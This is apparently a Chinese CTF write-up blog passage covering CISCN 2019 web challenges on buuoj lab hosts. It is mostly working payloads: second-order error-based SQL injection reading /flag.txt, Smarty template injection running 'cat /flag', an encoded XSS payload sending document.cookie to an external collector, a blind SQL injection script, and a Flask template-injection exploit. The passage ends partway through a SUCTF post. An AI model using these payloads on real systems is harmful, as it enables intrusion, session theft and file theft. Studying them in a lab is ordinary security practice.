<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;config.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);</span><br><span class="line"></span><br><span class="line">$DATABASE &#x3D; array(</span><br><span class="line"></span><br><span class="line">    &quot;host&quot; &#x3D;&gt; &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;username&quot; &#x3D;&gt; &quot;root&quot;,</span><br><span class="line">    &quot;password&quot; &#x3D;&gt; &quot;root&quot;,</span><br><span class="line">    &quot;dbname&quot; &#x3D;&gt;&quot;ctfusers&quot;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$db &#x3D; new mysqli($DATABASE[&#39;host&#39;],$DATABASE[&#39;username&#39;],$DATABASE[&#39;password&#39;],$DATABASE[&#39;dbname&#39;]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;confirm.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line">&#x2F;&#x2F;var_dump($_POST);</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; $_POST[&quot;address&quot;];</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if($fetch-&gt;num_rows&gt;0) &#123;</span><br><span class="line">        $msg &#x3D; $user_name.&quot;已提交订单&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;insert into &#96;user&#96; ( &#96;user_name&#96;, &#96;address&#96;, &#96;phone&#96;) values( ?, ?, ?)&quot;;</span><br><span class="line">        $re &#x3D; $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);</span><br><span class="line">        $re &#x3D; $re-&gt;execute();</span><br><span class="line">        if(!$re) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;订单提交成功&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;确认订单&lt;&#x2F;title&gt;</span><br><span class="line">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;img class&#x3D;&quot;logo&quot; src&#x3D;&quot;.&#x2F;assets&#x2F;img&#x2F;logo-zh.png&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class="line">                &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">            &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>在confirm.php、delete.php、search.php和change.phpz中存在报错注入的可能，username和phone过滤非常严格，但是address没怎么过滤，所以考虑这个参数。</p>
<p>因为在confirm.php中在存入的过程中使用了bind_param函数，所以无法绕过。在change.php将之前存入的地址拿来出来，存在二次注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;confirm.php HTTP&#x2F;1.1</span><br><span class="line">Host: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 105</span><br><span class="line">Origin: http:&#x2F;&#x2F;4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn&#x2F;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">user_name&#x3D;1&amp;phone&#x3D;1&amp;address&#x3D;1&#39;  where user_id&#x3D;(updatexml(0,concat(0,(select load_file(&#39;&#x2F;flag.txt&#39;))),0))#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;change.php HTTP&#x2F;1.1</span><br><span class="line">Host: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Origin: http:&#x2F;&#x2F;4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn&#x2F;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">user_name&#x3D;1&amp;phone&#x3D;1&amp;address&#x3D;1</span><br></pre></td></tr></table></figure>

<p>回显数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">errorXPATH syntax error: &#39;flag&#123;e9485017-ebf4-4ea4-8579-daa&#39;</span><br></pre></td></tr></table></figure>

<p>显示不全，再你想输出一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;confirm.php HTTP&#x2F;1.1</span><br><span class="line">Host: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 114</span><br><span class="line">Origin: http:&#x2F;&#x2F;4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn&#x2F;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">user_name&#x3D;1&amp;phone&#x3D;1&amp;address&#x3D;1&#39;  where user_id&#x3D;(updatexml(0,concat(0,(select reverse(load_file(&#39;&#x2F;flag.txt&#39;)))),0))#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;change.php HTTP&#x2F;1.1</span><br><span class="line">Host: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Origin: http:&#x2F;&#x2F;4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn&#x2F;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">user_name&#x3D;1&amp;phone&#x3D;1&amp;address&#x3D;1</span><br></pre></td></tr></table></figure>

<p>输出内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">errorXPATH syntax error: &#39;</span><br><span class="line">&#125;6e91d8479aad-9758-4ae4-4fbe-71&#39;</span><br></pre></td></tr></table></figure>

<p>拼接即可</p>
<h2 id="华东南赛区-Web11"><a href="#华东南赛区-Web11" class="headerlink" title="华东南赛区 Web11"></a>华东南赛区 Web11</h2><p><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">关于SSTI</a></p>
<p>打开题目，页面说提供了查询公网IP的api,右上角还有显示IP，于是在头部加入X-Forwarded-For</p>
<p><img src="../pic/94.png" alt=""></p>
<p>可能存在SSTI，测试一下的确存在SSTI</p>
<p><img src="../pic/96.png" alt=""></p>
<p>在网页的最下方发现了<strong>Build With Smarty</strong> </p>
<p>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。 3.1.30</p>
<p><img src="../pic/97.png" alt=""></p>
<p>Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但是Smarty3.0手册说已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。发现报错了</p>
<p><img src="../pic/98.png" alt=""></p>
<p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
<p>那么对于php5的环境我们就可以使用，服务器是7.0+无法使用js标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>有一个<a href="https://www.smarty.net/docs/zh_CN/language.function.if.tpl" target="_blank" rel="noopener">{if}标签</a>可以使用</p>
<p>marty的<code>{if}</code>条件判断和PHP的<a href="http://php.net/if" target="_blank" rel="noopener">if</a> 非常相似，只是增加了一些特性。 每个<code>{if}</code>必须有一个配对的<code>{/if}</code>. 也可以使用<code>{else}</code> 和 <code>{elseif}</code>. 全部的PHP条件表达式和函数都可以在if内使用，如<em>||</em>, <em>or</em>, <em>&amp;&amp;</em>, <em>and</em>, <em>is_array()</em>, 等等.</p>
<p>将X-Forwarded-For头改为{if phpinfo()}{/if}可以查看phpinfo</p>
<p><img src="../pic/99.png" alt=""></p>
<p>{if system(‘cat /flag’)}{/if}即可获取到flag</p>
<p><a href="https://www.jianshu.com/p/eb8d0137a7d3" target="_blank" rel="noopener">参考链接</a></p>
<h2 id="华东北赛区-Web2"><a href="#华东北赛区-Web2" class="headerlink" title="华东北赛区 Web2"></a>华东北赛区 Web2</h2><p>使用御剑扫描发现login.php，admin.php</p>
<p><img src="../pic/100.png" alt=""></p>
<p>访问admin.php，发现要admin才访问，去login.php注册一个账号，然后登入，有一个投稿</p>
<p><img src="../pic/101.png" alt=""></p>
<p>明显的提示这题是XSS</p>
<p>提交数据之后，“=” 被替换成了“等于号”，src,//被替换成waf，单引号、括号、双引号会被替换成中文的。</p>
<p>来自赵师傅的payload     svg标签 ：xml自动解析html实体编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in_str &#x3D; &quot;(function()&#123;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api&amp;id&#x3D;dzWPkK&amp;keepsession&#x3D;0&amp;location&#x3D;&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation&#x3D;&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;cookie&#x3D;&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;opener&#x3D;&#39;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)());&#125;)();&quot;</span><br><span class="line">output &#x3D; &quot;&quot;</span><br><span class="line">for c in in_str:</span><br><span class="line">    output +&#x3D; &quot;&amp;#&quot; + str(ord(c))</span><br><span class="line">print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;&#x2F;script&gt;&quot;)</span><br></pre></td></tr></table></figure>

<p>得到地址后去commitbug.php（反馈）页面提交url</p>
<p><img src="../pic/102.png" alt=""></p>
<p>url中要将*.buuoj.cn改成web</p>
<p>附上碰撞的脚本，发现使用python编写会出错（字符与MD5对应不上）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">for($a&#x3D;0;substr(md5($a),0,6)!&#x3D;&#39;2ccf73&#39;;$a++)&#123;&#125;</span><br><span class="line">echo md5($a);</span><br><span class="line">echo urldecode(&#39;%09&#39;);</span><br><span class="line">echo $a;</span><br><span class="line"> &#x2F;&#x2F;2ccf731c402b81796327fb7a4c5cd943	225315</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>去xss平台手cookie</p>
<p><img src="../pic/103.png" alt=""></p>
<p>修改cookie为收到的cookie，访问admin.php   存在sql注入</p>
<p><img src="../pic/104.png" alt="">)<img src="../pic/105.png" alt=""></p>
<p>编写注入脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2&#x2F;19&#x2F;2020 12:34 AM</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def str2hex(strs):</span><br><span class="line">    hexs&#x3D;&#39;0x&#39;</span><br><span class="line">    for x in range(len(strs)):</span><br><span class="line">        hexs+&#x3D;hex(ord(strs[x]))[2:]</span><br><span class="line">    print(hexs)</span><br><span class="line">    return hexs</span><br><span class="line"></span><br><span class="line">def get(payload):</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;da74811e-0cb8-498a-a1c7-362929c21b2d.node3.buuoj.cn&#x2F;admin.php?id&#x3D;0^(&#39;+payload+&#39;)&#39;</span><br><span class="line">    # print(url)</span><br><span class="line">    html &#x3D; requests.get(url,cookies&#x3D;&#123;&#39;PHPSESSID&#39;:&#39;e7f4c1e48fd638f2a517cbe6d0a81857&#39;&#125;)</span><br><span class="line">    # print(html)</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">def binsea(s_payload,len&#x3D;999):</span><br><span class="line">    result &#x3D; &#39;&#39;</span><br><span class="line">    x&#x3D;1</span><br><span class="line">    while x &lt;&#x3D; len :</span><br><span class="line">        error &#x3D; 0</span><br><span class="line">        left &#x3D; 0</span><br><span class="line">        right &#x3D; 126</span><br><span class="line">        while left &lt;&#x3D; right:</span><br><span class="line">            mid &#x3D; (left + right) &#x2F; 2</span><br><span class="line">            payload &#x3D; &quot;ascii(substr((%s),%d,1))&gt;%d&quot; % (s_payload,x, mid)</span><br><span class="line"></span><br><span class="line">            res &#x3D; get(payload)</span><br><span class="line">            if res.status_code &#x3D;&#x3D; 404 or res.status_code &#x3D;&#x3D; 429:</span><br><span class="line">                x&#x3D;x-1</span><br><span class="line">                error &#x3D; 1</span><br><span class="line">                break</span><br><span class="line">            html&#x3D;res.text</span><br><span class="line">            # print(html,&#39;*-*-*-*-*-*&#39;, mid)</span><br><span class="line">            if &#39;不能查询管理员哦&#39;  in html:</span><br><span class="line">                left &#x3D; mid +1</span><br><span class="line">            else:</span><br><span class="line">                right &#x3D; mid -1</span><br><span class="line">        mid &#x3D; int((left + right + 1) &#x2F; 2)</span><br><span class="line">        if mid &#x3D;&#x3D; 0 :</span><br><span class="line">            break</span><br><span class="line">        if error &#x3D;&#x3D; 0 :</span><br><span class="line">            result +&#x3D; chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x&#x3D;x+1</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def get_database():</span><br><span class="line">    s_payload&#x3D;&#39;database()&#39;</span><br><span class="line">    database &#x3D; binsea(s_payload)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line">def get_tables(db):</span><br><span class="line">    db&#x3D;str2hex(db)</span><br><span class="line">    s_payload &#x3D; &#39;select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;+db+&#39;)&#39;</span><br><span class="line">    tables&#x3D;binsea(s_payload)</span><br><span class="line"></span><br><span class="line">def get_columns(table):</span><br><span class="line">    table &#x3D; str2hex(table)</span><br><span class="line">    s_payload &#x3D; &#39;select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;+table+&#39;)&#39;</span><br><span class="line">    columns&#x3D;binsea(s_payload)</span><br><span class="line"></span><br><span class="line">def get_data(columns,table):</span><br><span class="line">    s_payload&#x3D;&#39;select(group_concat(&#39;+columns+&#39;))from(&#39;+table+&#39;)&#39;</span><br><span class="line">    password&#x3D;binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># get_database() #ciscn</span><br><span class="line"></span><br><span class="line"># get_tables(&#39;ciscn&#39;) #flag,users</span><br><span class="line"></span><br><span class="line"># get_columns(&#39;flag&#39;) #flagg</span><br><span class="line"></span><br><span class="line">get_data(&#39;flagg&#39;,&#39;flag&#39;) #flag&#123;88331b80-7fb8-4f2f-9fa1-a4b85bd8562d&#125;</span><br></pre></td></tr></table></figure>



<h2 id="华东南赛区-Double-Secret"><a href="#华东南赛区-Double-Secret" class="headerlink" title="华东南赛区 Double Secret"></a>华东南赛区 Double Secret</h2><p>打卡题目的提示是:<code>Welcome To Find Secret</code></p>
<p>使用御剑扫一下目录，扫描到robots.txt</p>
<p>内容是: <code>It is Android ctf</code></p>
<p>尝试范围/secret  提示<code>Tell me your secret.I will encrypt it so others can&#39;t see</code></p>
<p>传入参数?secret=123456789后报错</p>
<p><img src="../pic/106.png" alt=""></p>
<p>发现是flask框架，点开/app/app.py后有如下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">File &quot;&#x2F;app&#x2F;app.py&quot;, line 35, in secret</span><br><span class="line"></span><br><span class="line">    if(secret&#x3D;&#x3D;None):</span><br><span class="line"></span><br><span class="line">        return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;</span><br><span class="line"></span><br><span class="line">    rc&#x3D;rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line"></span><br><span class="line">    deS&#x3D;rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    a&#x3D;render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line"> [Open an interactive python shell in this frame]  </span><br><span class="line"></span><br><span class="line">    if &#39;ciscn&#39; in a.lower():</span><br><span class="line"></span><br><span class="line">        return &#39;flag detected!&#39;</span><br><span class="line"></span><br><span class="line">    return a</span><br></pre></td></tr></table></figure>

<p>是RC4加密，RC4算法加密又是解密将payload加密就好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2&#x2F;25&#x2F;2020 11:38 PM</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class RC4:</span><br><span class="line">    def __init__(self, key):</span><br><span class="line">        self.key &#x3D; key</span><br><span class="line">        self.key_length &#x3D; len(key)</span><br><span class="line">        self._init_S_box()</span><br><span class="line"></span><br><span class="line">    def _init_S_box(self):</span><br><span class="line">        self.Box &#x3D; [i for i in range(256)]</span><br><span class="line">        k &#x3D; [self.key[i % self.key_length] for i in range(256)]</span><br><span class="line">        j &#x3D; 0</span><br><span class="line">        for i in range(256):</span><br><span class="line">            j &#x3D; (j + self.Box[i] + ord(k[i])) % 256</span><br><span class="line">            self.Box[i], self.Box[j] &#x3D; self.Box[j], self.Box[i]</span><br><span class="line"></span><br><span class="line">    def crypt(self, plaintext):</span><br><span class="line">        i &#x3D; 0</span><br><span class="line">        j &#x3D; 0</span><br><span class="line">        result &#x3D; &#39;&#39;</span><br><span class="line">        for ch in plaintext:</span><br><span class="line">            i &#x3D; (i + 1) % 256</span><br><span class="line">            j &#x3D; (j + self.Box[i]) % 256</span><br><span class="line">            self.Box[i], self.Box[j] &#x3D; self.Box[j], self.Box[i]</span><br><span class="line">            t &#x3D; (self.Box[i] + self.Box[j]) % 256</span><br><span class="line">            result +&#x3D; chr(self.Box[t] ^ ord(ch))</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;69f0dda2-d8d5-458e-97f9-342bff8d47a4.node3.buuoj.cn&#x2F;secret?secret&#x3D;&quot;</span><br><span class="line">a &#x3D; RC4(&#39;HereIsTreasure&#39;)</span><br><span class="line">cmd &#x3D; &quot;&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#39;&#x2F;flag.txt&#39;).read() &#125;&#125;&quot;</span><br><span class="line">payload &#x3D; urllib.parse.quote(a.crypt(cmd))</span><br><span class="line">print(payload)</span><br><span class="line">res &#x3D; requests.get(url + payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ciscn2019</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录11-SUCTF2019web复现</title>
    <url>/2020/02/04/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%9511-SUCTF2019web%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h2><ul>
<li><p>2019 usa black hat一个议题  <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">会议pdf</a></p>
<p><img src="../pic/67" alt=""></p>
</li>
<li><p>关于<a href="https://datatracker.ietf.org/doc/rfc5891/" target="_blank" rel="noopener">idna编码</a>   在处理℆时，经过idna编码，再经过utf-8解码就会变成c/u</p>
</li>
<li><p>CVE-2019-9636  : urlsplit不处理NFKC标准化   </p>
</li>
</ul>
<a id="more"></a>

<p>题目给了源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;getUrl&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def getUrl():</span><br><span class="line">    url &#x3D; request.args.get(&quot;url&quot;)</span><br><span class="line">    host &#x3D; parse.urlparse(url).hostname   #返回netloc部分</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return &quot;我扌 your problem? 111&quot;</span><br><span class="line">    parts &#x3D; list(urlsplit(url))</span><br><span class="line">    host &#x3D; parts[1]</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return &quot;我扌 your problem? 222 &quot; + host</span><br><span class="line">    newhost &#x3D; []</span><br><span class="line">    for h in host.split(&#39;.&#39;):</span><br><span class="line">        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</span><br><span class="line">    parts[1] &#x3D; &#39;.&#39;.join(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl &#x3D; urlunsplit(parts).split(&#39; &#39;)[0]</span><br><span 